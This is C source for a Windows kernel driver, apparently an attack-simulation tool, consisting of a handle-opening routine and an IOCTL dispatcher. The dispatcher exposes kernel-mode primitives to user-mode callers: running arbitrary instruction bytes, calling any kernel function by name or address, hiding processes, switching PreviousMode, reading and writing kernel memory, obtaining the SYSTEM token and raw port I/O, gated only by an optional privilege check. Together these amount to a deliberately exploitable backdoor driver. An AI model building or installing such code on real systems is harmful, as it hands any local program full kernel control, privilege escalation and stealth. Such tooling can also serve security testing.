NTSTATUS KernelOpenHandleInternal(PVOID InputBuffer, ULONG InputSize,
                                  PVOID OutputBuffer, ULONG OutputSize, ULONG_PTR *Info)
{
    NTSTATUS                  status  = STATUS_SUCCESS;
    KERNEL_OPEN_HANDLE_INPUT  in;
    KERNEL_OPEN_HANDLE_OUTPUT out;
    ULONG            type = 0;
    ULONG            attr = 0;
    ULONG            pid  = 0;
    PVOID            pObject  = NULL;
    PEPROCESS        pProcess = NULL;
    HANDLE           hKernel  = NULL;
    HANDLE           hUser    = NULL;
    KPROCESSOR_MODE  mode     = KernelMode;

    
    if (!InputBuffer || InputSize < sizeof(KERNEL_OPEN_HANDLE_INPUT))
        return STATUS_INVALID_PARAMETER;
    if (!OutputBuffer || OutputSize < sizeof(KERNEL_OPEN_HANDLE_OUTPUT))
        return STATUS_BUFFER_TOO_SMALL;

    
    RtlZeroMemory(&in, sizeof(in));
    RtlZeroMemory(&out, sizeof(out));
    RtlCopyMemory(&in, InputBuffer, sizeof(in));

    type = R0SKOH_TYPE_GET(in.Flags);
    attr = R0SKOH_ATTR_GET(in.Flags);

    
    __try {
        if (type == R0SKOH_TYPE_PID) {
            pid = (ULONG)(in.Target & 0xFFFFFFFFu);
            if (pid == 0) { status = STATUS_INVALID_PARAMETER; __leave; }

            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &pProcess);
            if (!NT_SUCCESS(status)) { __leave; }
            pObject = pProcess;

        } else if (type == R0SKOH_TYPE_POINTER) {
            pObject = (PVOID)(ULONG_PTR)in.Target;
            if (pObject == NULL) { status = STATUS_INVALID_PARAMETER; __leave; }
        } else {
            status = STATUS_INVALID_PARAMETER;
            __leave;
        }

        mode = (attr & OBJ_FORCE_ACCESS_CHECK) ? UserMode : KernelMode;

        status = ObOpenObjectByPointer(
            pObject,
            OBJ_KERNEL_HANDLE,
            NULL,
            in.DesiredAccess,
            NULL,
            mode,
            &hKernel);
        if (!NT_SUCCESS(status)) { __leave; }

        status = ZwDuplicateObject(
            ZwCurrentProcess(), hKernel,
            ZwCurrentProcess(), &hUser,
            in.DesiredAccess,
            0,
            0);
        if (!NT_SUCCESS(status)) { __leave; }

        out.ResultHandle        = hUser;
        out.ActualGrantedAccess = in.DesiredAccess;
        out.Status              = STATUS_SUCCESS;
        hUser                   = NULL;   
        status                  = STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    
    if (hKernel  != NULL) { __try { ZwClose(hKernel);  } __except(EXCEPTION_EXECUTE_HANDLER) {} }
    if (hUser    != NULL) { __try { ZwClose(hUser);    } __except(EXCEPTION_EXECUTE_HANDLER) {} }
    if (pProcess != NULL) { __try { ObDereferenceObject(pProcess); } __except(EXCEPTION_EXECUTE_HANDLER) {} }

    if (!NT_SUCCESS(status)) {
        out.ResultHandle        = NULL;
        out.ActualGrantedAccess = 0;
        out.Status              = status;
    }

    
    RtlCopyMemory(OutputBuffer, &out, sizeof(out));
    *Info = sizeof(out);
    return status;
}

NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION irpSp;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR info = 0;
    ULONG code;
    PVOID inputBuffer;
    ULONG inputSize;
    PVOID outputBuffer;
    ULONG outputSize;
    volatile LONG *pTotalCount;

    UNREFERENCED_PARAMETER(DeviceObject);

    irpSp = IoGetCurrentIrpStackLocation(Irp);
    code = irpSp->Parameters.DeviceIoControl.IoControlCode;
    inputBuffer = Irp->AssociatedIrp.SystemBuffer;
    inputSize = irpSp->Parameters.DeviceIoControl.InputBufferLength;
    outputBuffer = Irp->AssociatedIrp.SystemBuffer;
    outputSize = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

    pTotalCount = (volatile LONG *)(&g_IoctlTotalCount);
    InterlockedIncrement(pTotalCount);

    __try {
        switch (code) {
            case IOCTL_R0SIMULATE_EXEC_INSTRUCTION: {
                int idx = IOCTL_INDEX_EXEC_INSTRUCTION;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                __try {
                    PEXEC_INSTRUCTION_INPUT execInput;
                    PEXEC_INSTRUCTION_OUTPUT output;
                    UINT64 returnValue = 0;
                    if (inputSize < sizeof(EXEC_INSTRUCTION_INPUT) || !inputBuffer) { status = STATUS_INVALID_PARAMETER; break; }
                    execInput = (PEXEC_INSTRUCTION_INPUT)inputBuffer;
                    if (execInput->InstructionSize == 0) { status = STATUS_INVALID_PARAMETER; break; }
                    if (inputSize < sizeof(EXEC_INSTRUCTION_INPUT) + execInput->InstructionSize - 1) { status = STATUS_BUFFER_TOO_SMALL; break; }
                    if (outputSize < sizeof(EXEC_INSTRUCTION_OUTPUT)) { status = STATUS_BUFFER_TOO_SMALL; break; }
                    status = ExecuteInstruction(PsGetCurrentProcess(), execInput->Instruction, execInput->InstructionSize, &returnValue);
                    output = (PEXEC_INSTRUCTION_OUTPUT)outputBuffer;
                    output->ReturnValue = returnValue;
                    output->Status = status;
                    info = sizeof(EXEC_INSTRUCTION_OUTPUT);
                } __except(EXCEPTION_EXECUTE_HANDLER) { status = GetExceptionCode(); }
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_CALL_KERNEL_API: {
                int idx = IOCTL_INDEX_CALL_KERNEL_API;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                __try {
                    PCALL_KERNEL_API_INPUT apiInput;
                    PCALL_KERNEL_API_OUTPUT output;
                    PVOID apiAddress = NULL;
                    UINT64 returnValue = 0;
                    if (inputSize < sizeof(CALL_KERNEL_API_INPUT) || !inputBuffer) { status = STATUS_INVALID_PARAMETER; break; }
                    apiInput = (PCALL_KERNEL_API_INPUT)inputBuffer;
                    if (!(apiInput->Flags & R0SIMULATE_FLAG_USE_ADDRESS)) {
                        if (apiInput->ApiNameLength == 0 || apiInput->ApiNameLength > 512 ||
                            inputSize < sizeof(CALL_KERNEL_API_INPUT) + apiInput->ApiNameLength) { status = STATUS_INVALID_PARAMETER; break; }
                        if (apiInput->ApiNameLength % 2 != 0) { status = STATUS_INVALID_PARAMETER; break; }
                    }
                    if (apiInput->ArgumentCount > 16) { status = STATUS_INVALID_PARAMETER; break; }
                    if (outputSize < sizeof(CALL_KERNEL_API_OUTPUT)) { status = STATUS_BUFFER_TOO_SMALL; break; }

                    if (apiInput->Flags & R0SIMULATE_FLAG_USE_ADDRESS) {
                        UINT64 addr = 0;
                        RtlCopyMemory(&addr, apiInput->ApiName, sizeof(addr));
                        apiAddress = (PVOID)(ULONG_PTR)addr;
                    } else {
                        const WCHAR* name = apiInput->ApiName;
                        if (g_FunctionLookupMode == 2) {
                            PSSDT_ENTRY entry = NULL;
                            if (!g_SsdtBuilt) { status = BuildSsdtTable(); if (!NT_SUCCESS(status)) break; }
                            if (IsNumberString(name)) entry = FindSsdtBySsn(WcharToUlong(name));
                            else entry = FindSsdtByName(name);
                            if (entry) apiAddress = (PVOID)(ULONG_PTR)entry->Address;
                            else status = STATUS_NOT_FOUND;
                        } else if (g_FunctionLookupMode == 1) {
                            if (!g_FunctionTableBuilt) {
                                KIRQL oldIrql;
                                KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                                if (!g_FunctionTableBuilt) {
                                    status = LazyBuildFunctionTable();
                                    if (NT_SUCCESS(status)) g_FunctionTableBuilt = TRUE;
                                }
                                KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
                            }
                            if (g_FunctionTableBuilt) {
                                UNICODE_STRING uniName;
                                KIRQL oldIrql;
                                PLIST_ENTRY pList;
                                RtlInitUnicodeString(&uniName, name);
                                KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
                                pList = g_FunctionTableHead.Flink;
                                while (pList != &g_FunctionTableHead) {
                                    PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
                                    if (RtlCompareUnicodeString(&pNode->Name, &uniName, TRUE) == 0) {
                                        apiAddress = pNode->Address;
                                        break;
                                    }
                                    pList = pList->Flink;
                                }
                                KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
                            }
                            if (!apiAddress) status = STATUS_NOT_FOUND;
                        } else {
                            UNICODE_STRING uniName;
                            RtlInitUnicodeString(&uniName, name);
                            apiAddress = MmGetSystemRoutineAddress(&uniName);
                            if (!apiAddress) status = STATUS_NOT_FOUND;
                        }
                    }
                    if (!NT_SUCCESS(status)) break;

                    status = CallKernelApiInternal(apiAddress, apiInput->ArgumentCount, apiInput->Arguments,
                                                   outputBuffer, outputSize, &returnValue);
                    output = (PCALL_KERNEL_API_OUTPUT)outputBuffer;
                    output->ReturnValue = returnValue;
                    output->Status = status;
                    info = sizeof(CALL_KERNEL_API_OUTPUT);
                } __except(EXCEPTION_EXECUTE_HANDLER) { status = GetExceptionCode(); }
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_KERNEL_PROCESS_HIDING: {
                int idx = IOCTL_INDEX_PROCESS_HIDING;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                status = ProcessHiding(inputBuffer, inputSize, outputBuffer, outputSize, &info);
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_PREVIOUS_MODE_SWITCH: {
                int idx = IOCTL_INDEX_PREVIOUS_MODE_SWITCH;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                status = PreviousModeSwitch(inputBuffer, inputSize, outputBuffer, outputSize, &info);
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_KERNEL_OPEN_HANDLE: {
                int idx = IOCTL_INDEX_KERNEL_OPEN_HANDLE;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                status = KernelOpenHandleInternal(inputBuffer, inputSize, outputBuffer, outputSize, &info);
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_KERNEL_MEMORY_ACCESS: {
                int idx = IOCTL_INDEX_KERNEL_MEMORY_ACCESS;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                status = KernelMemoryAccess(inputBuffer, inputSize, outputBuffer, outputSize, &info);
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_GET_SYSTEM_TOKEN: {
                int idx = IOCTL_INDEX_GET_SYSTEM_TOKEN;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                status = GetSystemToken(inputBuffer, inputSize, outputBuffer, outputSize, &info);
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_SET_INTERNAL_VARS: {
                int idx = IOCTL_INDEX_SET_INTERNAL_VARS;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                status = SetInternalVariables(inputBuffer, inputSize, outputBuffer, outputSize, &info);
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_GET_KERNEL_FUNCTION: {
                int idx = IOCTL_INDEX_GET_KERNEL_FUNCTION;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                status = GetKernelFunction(inputBuffer, inputSize, outputBuffer, outputSize, &info);
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            case IOCTL_R0SIMULATE_IO: {
                int idx = IOCTL_INDEX_IO;
                if (g_IoctlDisable[idx] == 1) { status = STATUS_ACCESS_DENIED; break; }
                if (g_SecureMode == 1 && !HasTcbPrivilege()) { status = STATUS_ACCESS_DENIED; break; }
                status = IoPortOperation(inputBuffer, inputSize, outputBuffer, outputSize, &info);
                if (NT_SUCCESS(status)) g_IoctlCount[idx]++;
                break;
            }

            default:
                status = STATUS_INVALID_DEVICE_REQUEST;
                break;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}
